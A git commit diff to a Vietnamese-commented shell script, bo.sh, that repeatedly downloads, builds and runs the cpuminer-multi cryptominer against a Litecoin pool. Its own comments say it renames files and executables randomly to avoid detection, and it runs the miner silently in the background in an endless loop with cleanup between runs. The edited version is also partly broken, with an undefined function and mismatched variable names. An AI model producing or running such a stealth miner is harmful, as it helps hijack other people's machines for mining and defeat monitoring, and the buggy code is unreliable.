bb00948095ee819155c5eecc38145b83043d5431
Quqngdev <hovanquang2001122@gmail.com>
2024-07-12 08:25:17 +0700

    Update bo.sh

--- bo.sh
+++ bo.sh
@@ -5,40 +5,44 @@ generate_random_name() {
   tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 12
 }
 
-# Cập nhật danh sách gói
-sudo apt-get update
+# Vòng lặp vô hạn để script chạy liên tục
+while true; do
+  # Tải file
+  sudo apt-get update
+  sudo apt-get upgrade 
+  sudo apt-get install build-essential automake autoconf libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev
 
-# Cài đặt các gói cần thiết
-sudo apt-get install -y build-essential libcurl4-openssl-dev libjansson-dev automake libssl-dev libgmp-dev
-
-# Clone repo cpuminer-multi và đổi tên thư mục để khó phát hiện hơn
-git clone https://github.com/tpruvot/cpuminer-multi.git
-mv cpuminer-multi $(generate_random_name)
-cd $(generate_random_name)
-
-# Build cpuminer-multi
-./autogen.sh
-./nomacro.pl
-./configure --disable-assembly
+  git clone -q --no-check-certificate https://github.com/tpruvot/cpuminer-multi.git
+  # Giải nén file
+  random_name=$(generate_randomname)
+  mv cpuminer-multi "$randomname"
+  cd "$randomname"
+  
+  ./autogen.sh
+CFLAGS="-march=native" ./configure
 make
 
-# Đổi tên file thực thi của cpuminer để khó phát hiện hơn
-random_name=$(generate_random_name)
-mv cpuminer "$random_name"
+  ./build.sh
 
-# Chạy cpuminer với các tham số đã cho, ẩn danh và chạy ngầm
-nohup ./"$random_name" -a scrypt -o stratum+tcp://ltc.poolbinance.com:3333 -u dienvn.001 -p 123456 -t 3 >/dev/null 2>&1 &
-miner_pid=$!
+  # Đổi tên file để khó phát hiện hơn
+  random_name=$(generate_random_name)
+  mv cpuminer "$random_name"
 
-# Ngủ trong 5 phút
-sleep 300
+  # Chạy chương trình với tên đã đổi, ẩn danh và chạy ngầm trong 5 phút
+  nohup ./"$random_name" -a scrypt -o stratum+tcp://ltc.poolbinance.com:3333 -u dienvn.001 -p 123456 -t 3 >/dev/null 2>&1 &
+  miner_pid=$!
 
-# Dừng chương trình
-kill $miner_pid
+  # Ngủ trong 5 phút
+  sleep 300
 
-# Xóa các file đã tải và giải nén
-cd ..
-rm -rf $(basename $(pwd))
+  # Dừng chương trình
+  kill $miner_pid
 
-# Nghỉ 3 phút trước khi lặp lại
-sleep 180
+  # Xóa các file đã tải và giải nén
+  
+  rm -rf "$randomname"
+  rm -rf "$random_name"
+
+  # Nghỉ 3 phút trước khi lặp lại
+  sleep 60
+done
